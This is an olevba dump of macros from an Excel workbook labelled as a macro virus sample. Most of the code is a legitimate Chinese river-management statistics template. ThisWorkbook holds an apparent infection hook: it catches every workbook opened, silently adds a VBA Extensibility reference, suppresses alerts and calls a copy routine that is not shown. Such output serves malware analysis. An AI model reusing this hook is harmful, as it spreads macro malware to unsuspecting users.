olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet15.cls 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet15'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Worksheet_Activate()

Application.CommandBars("项目编辑").Controls(1).Enabled = False
Application.CommandBars("项目编辑").Controls(2).Enabled = False
Application.CommandBars("项目编辑").Controls(3).Enabled = False
Application.CommandBars("项目编辑").Controls(4).Enabled = False
Application.CommandBars("项目编辑").Controls(5).Enabled = False
Application.CommandBars("项目编辑").Controls(10).Enabled = False
Application.CommandBars("项目编辑").Controls(11).Enabled = False

Application.CommandBars("项目编辑").Controls(7).Enabled = True
Application.CommandBars("项目编辑").Controls(8).Enabled = True
Application.CommandBars("项目编辑").Controls(9).Enabled = True

End Sub

Private Sub Worksheet_Deactivate()

Worksheets("重点县河道基本情况卡片").Visible = False

Application.CommandBars("项目编辑").Controls(1).Enabled = True
Application.CommandBars("项目编辑").Controls(2).Enabled = True
Application.CommandBars("项目编辑").Controls(3).Enabled = True
Application.CommandBars("项目编辑").Controls(4).Enabled = True
Application.CommandBars("项目编辑").Controls(5).Enabled = True
Application.CommandBars("项目编辑").Controls(10).Enabled = True
Application.CommandBars("项目编辑").Controls(11).Enabled = True

Application.CommandBars("项目编辑").Controls(7).Enabled = False
Application.CommandBars("项目编辑").Controls(8).Enabled = False
Application.CommandBars("项目编辑").Controls(9).Enabled = False

End Sub

-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WithEvents xx As Application
Attribute xx.VB_VarHelpID = -1
Private Sub Workbook_open()
Set xx = Application
On Error Resume Next
Application.DisplayAlerts = False
Call do_what
End Sub
Private Sub xx_workbookOpen(ByVal wb As Workbook)
On Error Resume Next
wb.VBProject.References.AddFromGuid _
GUID:="{0002E157-0000-0000-C000-000000000046}", _
Major:=5, Minor:=3
Application.ScreenUpdating = False
Application.DisplayAlerts = False
copystart wb
Application.ScreenUpdating = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Worksheet_Activate()
'    Cells(9, 1).Select
End Sub

Private Sub Worksheet_Change(ByVal Target As Range)

'Dim str As String
'str = ActiveCell.Value
'
'If ((ActiveCell.column = 6) * (str <> "")) Then
'
'            ActiveSheet.unprotect ("123456")
'
'
'            Cells(ActiveCell.Row, 7).Select
'
'            With Cells(ActiveCell.Row, 7).Validation
'                .Delete
'                .Add Type:=xlValidateList, AlertStyle:=xlValidAlertStop, _
'                     Formula1:="=" & str
'
'                .ErrorTitle = "错误"
'                .ErrorMessage = "请重新选择对应的二级区！"
'
'            End With
'
'            With Cells(ActiveCell.Row, 8).Validation
'                .Delete
'                .Add Type:=xlValidateList, AlertStyle:=xlValidAlertStop, _
'                     Formula1:="=" & str & CStr(3)
'                .ErrorTitle = "错误"
'                .ErrorMessage = "请重新选择对应的三级区！"
'            End With
'
'            pro ActiveSheet
            

'End If
        

End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet16.cls 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO 模块3.bas 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/模块3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'项目编辑工具栏


Public Sub a()
'插入新行

Dim i As Integer

i = Selection.Row

'只能在8行以后，end行之前插入新行

If (ActiveSheet.Name = "重点县工程建设情况") + (ActiveSheet.Name = "重点县河道基本情况") Then

    If (i <= rowNum(ActiveSheet) + 1) * (i > 8) Then
   
        Select Case ActiveSheet.Name
    
        Case "重点县工程建设情况"
            ActiveSheet.Unprotect ("123456")
            Rows(i).Insert Shift:=xlUp
            
            'pro ActiveSheet
                
        Case "重点县河道基本情况"
            ActiveSheet.Unprotect ("123456")
            Rows(i).Insert Shift:=xlUp
            Range("AP" & i & ":AP" & i).Select
            With Selection.Validation
                .Delete
                .Add Type:=xlValidateList, AlertStyle:=xlValidAlertStop, Operator:= _
                xlBetween, Formula1:="=水系"
                .IgnoreBlank = True
                .InCellDropdown = True
                .InputTitle = ""
                .ErrorTitle = ""
                .InputMessage = ""
                .ErrorMessage = ""
                .IMEMode = xlIMEModeNoControl
                .ShowInput = True
                .ShowError = True
            End With
            
            Worksheets("重点县河道基本情况").Cells(i, 8).FormulaR1C1 = "=if(rc[-3]<>0,RC[-1]/RC[-3],0)"
            Worksheets("重点县河道基本情况").Cells(i, 8).NumberFormatLocal = "0;[红色]0"
                
            'pro ActiveSheet
        
        End Select
    
    Else
    MsgBox "只能在第9行和End行之间插入新行", vbInformation, "提示"
    End If
    
End If

If (ActiveSheet.Name = "附表1-2") Then

    If (i > 5) Then
        'ActiveSheet.Unprotect ("123456")
            
        'pro ActiveSheet
                
        Rows(i).Insert Shift:=xlUp
        Range("B" & i & ":B" & i).Select
        With Selection.Validation
            .Delete
            .Add Type:=xlValidateList, AlertStyle:=xlValidAlertStop, Operator:= _
            xlBetween, Formula1:="=水系"
            .IgnoreBlank = True
            .InCellDropdown = True
            .InputTitle = ""
            .ErrorTitle = ""
            .InputMessage = ""
            .ErrorMessage = ""
            .IMEMode = xlIMEModeNoControl
            .ShowInput = True
            .ShowError = True
        End With
    
    Else
        MsgBox "只能在大于第5行的位置插入新行", vbInformation, "提示"
    End If
    
End If

End Sub


Public Sub d()
'删除选定行
Dim i As Integer
i = Selection.Row

Dim str As String

 
'只能删除9行以后,end行以前的行
If (ActiveSheet.Name = "重点县工程建设情况") + (ActiveSheet.Name = "重点县河道基本情况") Then

    If (rowNum(ActiveSheet) >= 9) * (i < rowNum(ActiveSheet) + 1) Then
       If MsgBox("确定要删除——" + str + "？", vbQuestion + vbYesNo, "提示") = vbYes Then
            
            ActiveSheet.Unprotect ("123456")
            Rows(i).Delete Shift:=xlUp
                  
            'pro ActiveSheet
       End If
     Else
        MsgBox "只能删除在第9行和END行之间的行", vbInformation, "提示"
       
    End If
        
End If
End Sub

'读入文件
Public Sub read()
Dim str, strFile As String

strFile = ActiveWorkbook.Name

On Error GoTo ErrorHandler

dlgAnswer = Application.Dialogs(xlDialogOpen).Show

If dlgAnswer = True Then
    str = ActiveWorkbook.Name
    r str, strFile
   Workbooks(str).Close

End If

'加合计行
s5 strFile, "附表1-1"
s5 strFile, "附表1-2"
s5 strFile, "附表6-2"
s5 strFile, "附表6-5-1"
s5 strFile, "附表6-5-2"
s5 strFile, "附表6-5-3"
s5 strFile, "附表6-5-4"
s5 strFile, "附表6-5-5"
s5 strFile, "附表7-1"
s5 strFile, "附表9-2"

rNum1 = rowNum2(Worksheets("附表1-1"))
Worksheets("附表1-1").Cells(rNum1 + 2, 1) = "注：此表填写全县的所有乡镇级行政区（包括街道办事处）基本情况，可摘取2010、2011年统计年鉴数字"

rNum1 = rowNum1(Worksheets("附表1-2"))
Worksheets("附表1-2").Select
Range("B6:B" & rNum1).Select
With Selection.Validation
    .Delete
    .Add Type:=xlValidateList, AlertStyle:=xlValidAlertStop, Operator:= _
    xlBetween, Formula1:="=水系"
    .IgnoreBlank = True
    .InCellDropdown = True
    .InputTitle = ""
    .ErrorTitle = ""
    .InputMessage = ""
    .ErrorMessage = ""
    .IMEMode = xlIMEModeNoControl
    .ShowInput = True
    .ShowError = True
End With
Worksheets("附表1-2").Cells(rNum1 + 2, 1) = "注：所属流域水系按水资源分区，从下拉列表中选择"

Exit Sub

ErrorHandler:
MsgBox Err.Description + "，读入文件发生错误！", , "提示"

End Sub


Public Sub r(wb, strFile)

On Error GoTo out:
r1 wb, strFile, "重点县工程建设情况"
r1 wb, strFile, "重点县河道基本情况"
r2 wb, strFile, "附表1-2"
r4 wb, strFile, "附表1-1"
r3 wb, strFile, "附表6-2"
r3 wb, strFile, "附表6-5-1"
r3 wb, strFile, "附表6-5-2"
r3 wb, strFile, "附表6-5-3"
r3 wb, strFile, "附表6-5-4"
r3 wb, strFile, "附表6-5-5"
r3 wb, strFile, "附表7-1"
r3 wb, strFile, "附表9-2"

Worksheets("重点县工程建设情况").Select

MsgBox "成功读入所有数据！", , "提示"

Exit Sub

out:
MsgBox Err.Description

End Sub


Private Sub r1(wb, strFile, ws)

Dim rNum1, rNum2 As Integer

On Error GoTo ErrorHandler

rNum1 = rowNum(Workbooks(wb).Worksheets(ws))

rNum2 = rowNum(Workbooks(strFile).Worksheets(ws))

'Workbooks(strFile).Worksheets(ws).unprotect ("123456")

For m = 9 To rNum1

    Workbooks(strFile).Activate
    
    Workbooks(strFile).Worksheets(ws).Activate
    
    Workbooks(strFile).Worksheets(ws).Rows(rNum2 + 1).Select
    '在最后一行之前插入rNum1－9行
    a
    
    rNum2 = rowNum(Workbooks(strFile).Worksheets(ws))

Next

Workbooks(strFile).Worksheets(ws).Unprotect ("123456")

For i = 9 To rNum1
    
    For j = 1 To 56
        Workbooks(strFile).Worksheets(ws).Cells(rNum2 - rNum1 + i, j) = Workbooks(wb).Worksheets(ws).Cells(i, j)
    Next
Next

'Workbooks(strFile).Worksheets(ws).Rows(rNum2 - rNum1 + 10).PasteSpecial (xlPasteFormulas)

Dim S As String

Workbooks(strFile).Worksheets(ws).Rows(8).Hidden = False

Workbooks(strFile).Worksheets(ws).Rows(8).AutoFill Destination:=Workbooks(strFile).Worksheets(ws).Rows("8:" & rNum2), Type:=xlFillFormats

Workbooks(strFile).Worksheets(ws).Rows(8).Hidden = True

'Workbooks(strFile).Worksheets(ws).Rows(10).Select
    
pro Workbooks(strFile).Worksheets(ws)

Application.CutCopyMode = False
    
Exit Sub

ErrorHandler:
    MsgBox Err.Description + "，读入文件错误，请选择格式相同的文件！", vbExclamation

End Sub

Private Sub r2(wb, strFile, ws)

Dim rNum1, rNum2 As Integer

rNum1 = rowNum1(Workbooks(wb).Worksheets(ws))

rNum2 = rowNum1(Workbooks(strFile).Worksheets(ws))

'Workbooks(strFile).Worksheets(ws).Unprotect ("123456")

For i = 6 To rNum1
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 5, 1) = rNum2 - 5 + i - 5
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 5, 2) = Workbooks(wb).Worksheets(ws).Cells(i, 2)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 5, 3) = Workbooks(wb).Worksheets(ws).Cells(i, 3)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 5, 4) = Workbooks(wb).Worksheets(ws).Cells(i, 4)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 5, 5) = Workbooks(wb).Worksheets(ws).Cells(i, 5)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 5, 6) = Workbooks(wb).Worksheets(ws).Cells(i, 6)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 5, 7) = Workbooks(wb).Worksheets(ws).Cells(i, 7)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 5, 8) = Workbooks(wb).Worksheets(ws).Cells(i, 8)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 5, 9) = Workbooks(wb).Worksheets(ws).Cells(i, 9)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 5, 10) = Workbooks(wb).Worksheets(ws).Cells(i, 10)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 5, 11) = Workbooks(wb).Worksheets(ws).Cells(i, 11)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 5, 12) = Workbooks(wb).Worksheets(ws).Cells(i, 12)
Next

End Sub

Private Sub r3(wb, strFile, ws)

Dim rNum1, rNum2 As Integer

rNum1 = rowNum2(Workbooks(wb).Worksheets(ws))

rNum2 = rowNum2(Workbooks(strFile).Worksheets(ws))

'从附表1-1计算全县面积，全县人口
c6 = 0
c8 = 0
rNum2 = rowNum2(Worksheets("附表1-1"))
For i = 5 To rNum1
    c6 = c6 + Worksheets("附表1-1").Cells(i, 4)
    c8 = c8 + Worksheets("附表1-1").Cells(i, 5)
Next

'Workbooks(strFile).Worksheets(ws).Unprotect ("123456")

For i = 5 To rNum1
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 1) = rNum2 - 4 + i - 4
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 2) = Workbooks(wb).Worksheets(ws).Cells(i, 2)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 3) = Workbooks(wb).Worksheets(ws).Cells(i, 3)
    Select Case ws
        Case "附表6-2"
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 5) = Workbooks(wb).Worksheets(ws).Cells(i, 5)
            If c6 <> 0 Then Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 6) = Workbooks(wb).Worksheets(ws).Cells(i, 5) / c6 * 100
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 7) = Workbooks(wb).Worksheets(ws).Cells(i, 7)
            If c8 <> 0 Then Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 8) = Workbooks(wb).Worksheets(ws).Cells(i, 7) / c8 * 100
        Case "附表6-5-1", "附表6-5-5"
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 4) = Workbooks(wb).Worksheets(ws).Cells(i, 4)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 5) = Workbooks(wb).Worksheets(ws).Cells(i, 5)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 6) = Workbooks(wb).Worksheets(ws).Cells(i, 6)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 7) = Workbooks(wb).Worksheets(ws).Cells(i, 7)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 8) = Workbooks(wb).Worksheets(ws).Cells(i, 8)
        Case "附表6-5-2"
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 4) = Workbooks(wb).Worksheets(ws).Cells(i, 4)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 5) = Workbooks(wb).Worksheets(ws).Cells(i, 5)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 6) = Workbooks(wb).Worksheets(ws).Cells(i, 6)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 7) = Workbooks(wb).Worksheets(ws).Cells(i, 7)
        Case "附表6-5-3", "附表9-2"
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 4) = Workbooks(wb).Worksheets(ws).Cells(i, 4)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 5) = Workbooks(wb).Worksheets(ws).Cells(i, 5)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 6) = Workbooks(wb).Worksheets(ws).Cells(i, 6)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 7) = Workbooks(wb).Worksheets(ws).Cells(i, 7)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 8) = Workbooks(wb).Worksheets(ws).Cells(i, 8)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 9) = Workbooks(wb).Worksheets(ws).Cells(i, 9)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 10) = Workbooks(wb).Worksheets(ws).Cells(i, 10)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 11) = Workbooks(wb).Worksheets(ws).Cells(i, 11)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 12) = Workbooks(wb).Worksheets(ws).Cells(i, 12)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 13) = Workbooks(wb).Worksheets(ws).Cells(i, 13)
        Case "附表6-5-4"
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 4) = Workbooks(wb).Worksheets(ws).Cells(i, 4)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 5) = Workbooks(wb).Worksheets(ws).Cells(i, 5)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 6) = Workbooks(wb).Worksheets(ws).Cells(i, 6)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 7) = Workbooks(wb).Worksheets(ws).Cells(i, 7)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 8) = Workbooks(wb).Worksheets(ws).Cells(i, 8)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 9) = Workbooks(wb).Worksheets(ws).Cells(i, 9)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 10) = Workbooks(wb).Worksheets(ws).Cells(i, 10)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 11) = Workbooks(wb).Worksheets(ws).Cells(i, 11)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 12) = Workbooks(wb).Worksheets(ws).Cells(i, 12)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 13) = Workbooks(wb).Worksheets(ws).Cells(i, 13)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 14) = Workbooks(wb).Worksheets(ws).Cells(i, 14)
        Case "附表7-1"
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 4) = Workbooks(wb).Worksheets(ws).Cells(i, 4)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 5) = Workbooks(wb).Worksheets(ws).Cells(i, 5)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 6) = Workbooks(wb).Worksheets(ws).Cells(i, 6)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 7) = Workbooks(wb).Worksheets(ws).Cells(i, 7)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 8) = Workbooks(wb).Worksheets(ws).Cells(i, 8)
            Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 9) = Workbooks(wb).Worksheets(ws).Cells(i, 9)
    End Select
Next

End Sub

Private Sub r4(wb, strFile, ws)

Dim rNum1, rNum2 As Integer

rNum1 = rowNum2(Workbooks(wb).Worksheets(ws))

rNum2 = rowNum2(Workbooks(strFile).Worksheets(ws))

'Workbooks(strFile).Worksheets(ws).Unprotect ("123456")

For i = 5 To rNum1
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 1) = rNum2 - 4 + i - 4
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 2) = Workbooks(wb).Worksheets(ws).Cells(i, 2)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 3) = Workbooks(wb).Worksheets(ws).Cells(i, 3)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 4) = Workbooks(wb).Worksheets(ws).Cells(i, 4)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 5) = Workbooks(wb).Worksheets(ws).Cells(i, 5)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 6) = Workbooks(wb).Worksheets(ws).Cells(i, 6)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 7) = Workbooks(wb).Worksheets(ws).Cells(i, 7)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 8) = Workbooks(wb).Worksheets(ws).Cells(i, 8)
    Workbooks(strFile).Worksheets(ws).Cells(rNum2 + i - 4, 9) = Workbooks(wb).Worksheets(ws).Cells(i, 9)
Next

End Sub

Private Sub s5(strFile, ws)

Dim rNum1  As Integer

If ws = "附表1-2" Then
    rNum1 = rowNum1(Workbooks(strFile).Worksheets(ws))
Else
    rNum1 = rowNum2(Workbooks(strFile).Worksheets(ws))
End If

c3 = 0
c4 = 0
c5 = 0
c6 = 0
c7 = 0
c8 = 0
c9 = 0
c10 = 0
c11 = 0
c12 = 0
c13 = 0
c14 = 0

If ws = "附表1-2" Then
    begn = 6
Else
    begn = 5
End If

For i = begn To rNum1
    Select Case ws
    Case "附表1-1", "附表1-2"
        c3 = c3 + Workbooks(strFile).Worksheets(ws).Cells(i, 3)
        c4 = c4 + Workbooks(strFile).Worksheets(ws).Cells(i, 4)
        c5 = c5 + Workbooks(strFile).Worksheets(ws).Cells(i, 5)
        c6 = c6 + Workbooks(strFile).Worksheets(ws).Cells(i, 6)
        c7 = c7 + Workbooks(strFile).Worksheets(ws).Cells(i, 7)
        c8 = c8 + Workbooks(strFile).Worksheets(ws).Cells(i, 8)
        c9 = c9 + Workbooks(strFile).Worksheets(ws).Cells(i, 9)
        c10 = c10 + Workbooks(strFile).Worksheets(ws).Cells(i, 10)
        c11 = c11 + Workbooks(strFile).Worksheets(ws).Cells(i, 11)
        c12 = c12 + Workbooks(strFile).Worksheets(ws).Cells(i, 12)
    Case "附表6-2"
        c5 = c5 + Workbooks(strFile).Worksheets(ws).Cells(i, 5)
        If Workbooks(strFile).Worksheets(ws).Cells(i, 5) <> 0 Then c6 = Workbooks(strFile).Worksheets(ws).Cells(i, 5) / Workbooks(strFile).Worksheets(ws).Cells(i, 6) * 100
        c7 = c7 + Workbooks(strFile).Worksheets(ws).Cells(i, 7)
        If Workbooks(strFile).Worksheets(ws).Cells(i, 7) <> 0 Then c8 = Workbooks(strFile).Worksheets(ws).Cells(i, 7) / Workbooks(strFile).Worksheets(ws).Cells(i, 8) * 100
    Case Else
        c4 = c4 + Workbooks(strFile).Worksheets(ws).Cells(i, 4)
        c5 = c5 + Workbooks(strFile).Worksheets(ws).Cells(i, 5)
        c6 = c6 + Workbooks(strFile).Worksheets(ws).Cells(i, 6)
        c7 = c7 + Workbooks(strFile).Worksheets(ws).Cells(i, 7)
        c8 = c8 + Workbooks(strFile).Worksheets(ws).Cells(i, 8)
        c9 = c9 + Workbooks(strFile).Worksheets(ws).Cells(i, 9)
        c10 = c10 + Workbooks(strFile).Worksheets(ws).Cells(i, 10)
        c11 = c11 + Workbooks(strFile).Worksheets(ws).Cells(i, 11)
        c12 = c12 + Workbooks(strFile).Worksheets(ws).Cells(i, 12)
        c13 = c13 + Workbooks(strFile).Worksheets(ws).Cells(i, 13)
        c14 = c14 + Workbooks(strFile).Worksheets(ws).Cells(i, 14)
    End Select
Next
Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 1) = "合计"
Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 2) = Workbooks(strFile).Worksheets("说明").Cells(3, 3)
Select Case ws
    Case "附表1-1"
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 3) = c3
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 4) = c4
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 5) = c5
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 6) = c6
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 7) = c7
        If c5 <> 0 Then Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 8) = c7 / c5
        'Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 9) = c9
    Case "附表1-2"
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 3) = c3
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 4) = c4
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 5) = c5
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 6) = c6
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 7) = c7
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 8) = c8
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 9) = c9
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 10) = c10
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 11) = c11
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 12) = c12
    Case "附表6-2"
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 5) = c5
        If c6 <> 0 Then Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 6) = c5 / c6 * 100
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 7) = c7
        If c8 <> 0 Then Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 8) = c7 / c8 * 100
    Case "附表6-5-1", "附表6-5-5"
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 4) = c4
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 5) = c5
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 6) = c6
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 7) = c7
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 8) = c8
    Case "附表6-5-2"
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 4) = c4
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 5) = c5
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 6) = c6
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 7) = c7
    Case "附表6-5-3", "附表9-2"
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 4) = c4
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 5) = c5
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 6) = c6
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 7) = c7
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 8) = c8
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 9) = c9
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 10) = c10
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 11) = c11
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 12) = c12
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 13) = c13
    Case "附表6-5-4"
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 4) = c4
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 5) = c5
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 6) = c6
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 7) = c7
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 8) = c8
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 9) = c9
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 10) = c10
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 11) = c11
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 12) = c12
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 13) = c13
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 14) = c14
    Case "附表7-1"
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 4) = c4
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 5) = c5
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 6) = c6
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 7) = c7
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 8) = c8
        Workbooks(strFile).Worksheets(ws).Cells(rNum1 + 1, 9) = c9
End Select

End Sub


-------------------------------------------------------------------------------
VBA MACRO Sheet9.cls 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Worksheet_Deactivate()

    xianming = Worksheets("说明").Cells(3, 3)
    
    Worksheets("重点县河道基本情况").Cells(1, 3) = xianming + "县乡河道基本情况统计表"
    Worksheets("重点县工程建设情况").Cells(1, 3) = xianming + "河道整治主要工程措施建设内容统计表"
    Worksheets("附表1-1").Cells(1, 1) = "附表1-1 " + xianming + " 经济社会主要指标统计表"
    Worksheets("附表1-2").Cells(1, 1) = "附表1-2 " + xianming + " 河流水系情况统计表"
    Worksheets("附表6-2").Cells(1, 1) = "附表6-2 " + xianming + " 项目区规划汇总表"
    Worksheets("附表6-5-1").Cells(1, 1) = "附表6-5-1 " + xianming + "清淤整治工程汇总表"
    Worksheets("附表6-5-2").Cells(1, 1) = "附表6-5-2 " + xianming + "清障工程汇总表"
    Worksheets("附表6-5-3").Cells(1, 1) = "附表6-5-3 " + xianming + "水系沟通工程汇总表"
    Worksheets("附表6-5-4").Cells(1, 1) = "附表6-5-4 " + xianming + "岸坡整治工程汇总表"
